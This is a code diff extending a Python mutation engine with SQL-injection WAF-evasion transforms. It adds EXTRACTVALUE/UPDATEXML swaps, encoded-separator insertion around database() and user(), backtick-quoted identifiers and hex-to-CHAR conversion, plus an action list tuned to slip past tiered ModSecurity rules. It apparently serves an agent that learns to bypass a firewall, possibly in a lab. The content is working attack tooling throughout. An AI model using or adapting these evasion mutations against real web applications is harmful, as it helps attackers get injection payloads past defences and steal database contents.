@@ -533,6 +533,129 @@ class MutationEngine:
             return payload
         return ".1" + payload
 
+    # =================================================================
+    # SEMANTIC mutations — added for tiered ModSec rules (Opsi B)
+    # These don't just rewrite syntax; they swap MySQL constructs that
+    # are semantically equivalent but lexically different, so signature
+    # regexes blocking specific function/identifier forms fail.
+    # =================================================================
+
+    @staticmethod
+    def func_swap_error(payload: str) -> str:
+        """Swap EXTRACTVALUE ↔ UPDATEXML (both XPath-family, error-based).
+        Bypasses WAF rules that blacklist a single function name.
+
+        EXTRACTVALUE(1, X)      → UPDATEXML(1, X, 1)
+        UPDATEXML(1, X, 1)      → EXTRACTVALUE(1, X)
+        """
+        if re.search(r'(?i)extractvalue\s*\(', payload):
+            # Need to consume only the function's arg list, not nested ).
+            # Quick heuristic: match up to the LAST ) before the outer
+            # context closes (usually ` or , in our corpus).
+            return re.sub(
+                r'(?is)extractvalue\s*\(\s*([^,]+?),\s*(.+?)\)(?=[\s,)]|$)',
+                lambda m: f"UPDATEXML({m.group(1)},{m.group(2)},1)",
+                payload, count=1,
+            )
+        if re.search(r'(?i)updatexml\s*\(', payload):
+            return re.sub(
+                r'(?is)updatexml\s*\(\s*([^,]+?),\s*(.+?),\s*[^,)]+\)(?=[\s,)]|$)',
+                lambda m: f"EXTRACTVALUE({m.group(1)},{m.group(2)})",
+                payload, count=1,
+            )
+        return payload
+
+    # ---- func_space family ------------------------------------------------
+    # Each variant inserts a DIFFERENT separator between the info-leak
+    # function name and its `()`. WAF rules differ in which separators
+    # they catch:
+    #   - literal `(database|user)\(\)`        →  any separator works
+    #   - `(database|user)\s*\(\s*\)`          →  needs non-\s sep (/**/ or %a0)
+    #   - rule + t:urlDecodeUni                →  %0a/%09 decoded to \s → blocked
+    #   - rule + t:replaceComments             →  /**/ stripped → blocked
+    # Giving the agent 4 discrete variants lets it discover which separator
+    # bypasses the specific WAF policy it is fighting.
+    _FUNC_PAREN_RX = (
+        r'(?i)\b(database|user|version|current_user|session_user|schema)\(\)'
+    )
+
+    @staticmethod
+    def _func_space_with(payload: str, sep: str) -> str:
+        return re.sub(
+            MutationEngine._FUNC_PAREN_RX,
+            lambda m: f"{m.group(1)}{sep}()",
+            payload,
+        )
+
+    @staticmethod
+    def func_space_literal(payload: str) -> str:
+        """database() → database ()  (literal space — bypasses naive \\(\\) regex)"""
+        return MutationEngine._func_space_with(payload, " ")
+
+    @staticmethod
+    def func_space_newline(payload: str) -> str:
+        """database() → database%0a()  (URL-encoded newline)"""
+        return MutationEngine._func_space_with(payload, "%0a")
+
+    @staticmethod
+    def func_space_tab(payload: str) -> str:
+        """database() → database%09()  (URL-encoded tab)"""
+        return MutationEngine._func_space_with(payload, "%09")
+
+    @staticmethod
+    def func_space_formfeed(payload: str) -> str:
+        """database() → database%0c()  (URL-encoded form-feed)"""
+        return MutationEngine._func_space_with(payload, "%0c")
+
+    @staticmethod
+    def func_space_nbsp(payload: str) -> str:
+        """database() → database%a0()  (non-breaking space — NOT in \\s)"""
+        return MutationEngine._func_space_with(payload, "%a0")
+
+    @staticmethod
+    def func_space_comment(payload: str) -> str:
+        """database() → database/**/()  (MySQL inline comment as whitespace)"""
+        return MutationEngine._func_space_with(payload, "/**/")
+
+    @staticmethod
+    def identifier_backtick(payload: str) -> str:
+        """Wrap FROM <table> identifier in backticks.
+        Bypasses regex like `FROM\\s+users`.
+
+        FROM users → FROM `users`
+        FROM information_schema.tables → FROM `information_schema`.`tables`
+        """
+        # FROM <schema>.<table>
+        payload = re.sub(
+            r'(?i)\bFROM\s+(\w+)\.(\w+)\b',
+            lambda m: f"FROM `{m.group(1)}`.`{m.group(2)}`",
+            payload,
+        )
+        # FROM <table>  (no schema, no existing backtick)
+        payload = re.sub(
+            r'(?i)\bFROM\s+(?!`)(\w+)\b(?!\s*\()',
+            lambda m: f"FROM `{m.group(1)}`",
+            payload,
+        )
+        return payload
+
+    @staticmethod
+    def hex_to_char(payload: str) -> str:
+        """Convert 0xNN hex literal → CHAR(NN[,NN,...]).
+        Bypasses regex like `0x[0-9a-f]+`.
+
+        0x3a            → CHAR(58)
+        0x7573657273    → CHAR(117,115,101,114,115)   # "users"
+        """
+        def to_char(m: re.Match) -> str:
+            hex_val = m.group(1)
+            if len(hex_val) % 2 != 0 or len(hex_val) < 2:
+                return m.group(0)
+            byts = [int(hex_val[i:i+2], 16) for i in range(0, len(hex_val), 2)]
+            return f"CHAR({','.join(str(b) for b in byts)})"
+        # Avoid re-encoding numeric col mutations from hex_encode (already CHAR/comma form)
+        return re.sub(r'0x([0-9a-fA-F]+)', to_char, payload)
+
 
 # Build action registry
 MUTATIONS = {
@@ -592,6 +715,18 @@ MUTATIONS = {
     # --- Parser-divergence (manual-bypass discoveries vs ModSec) ---
     "null_byte":         MutationEngine.null_byte,
     "dot_prefix":        MutationEngine.dot_prefix,
+    # --- Semantic mutations (tiered ModSec — Opsi B) ---
+    "func_swap_err":     MutationEngine.func_swap_error,
+    "ident_backtick":    MutationEngine.identifier_backtick,
+    "hex_to_char":       MutationEngine.hex_to_char,
+    # func_space family — 6 discrete separator variants so the agent
+    # can learn which one bypasses the WAF policy in play.
+    "func_sp_lit":       MutationEngine.func_space_literal,
+    "func_sp_nl":        MutationEngine.func_space_newline,
+    "func_sp_tab":       MutationEngine.func_space_tab,
+    "func_sp_ff":        MutationEngine.func_space_formfeed,
+    "func_sp_nbsp":      MutationEngine.func_space_nbsp,
+    "func_sp_cmt":       MutationEngine.func_space_comment,
 }
 
 ACTION_LIST = list(MUTATIONS.keys())
@@ -635,4 +770,23 @@ FILTER_MUTATION_HINTS = {
         "gbk_bypass", "hex_encode", "url_encode",
     ],
     "unknown": ACTION_LIST[:15],  # broad exploration
+    "tiered_modsec": [
+        # T1: blocks UNION/SELECT exact + comment terminators
+        "case", "case_split", "char_split", "ver_50000", "ver_00000",
+        "url_encode", "url_mid_char", "nested_union", "null_byte",
+        # T2a: information_schema literal (no lowercase transform)
+        "case",
+        # T2b: database()/user()/version() — try every separator variant
+        "func_sp_lit", "func_sp_nl", "func_sp_tab",
+        "func_sp_ff", "func_sp_nbsp", "func_sp_cmt",
+        # T2c: extractvalue ↔ updatexml
+        "func_swap_err",
+        "backtick",
+        # T3: blocks FROM users, 0x hex, etc.
+        "ident_backtick",  # FROM users → FROM `users`
+        "hex_to_char",     # 0x3a → CHAR(58)
+        # Whitespace family (always useful)
+        "tab_space", "newline", "vtab", "formfeed",
+        "between_space", "comment", "paren_full",
+    ],
 }
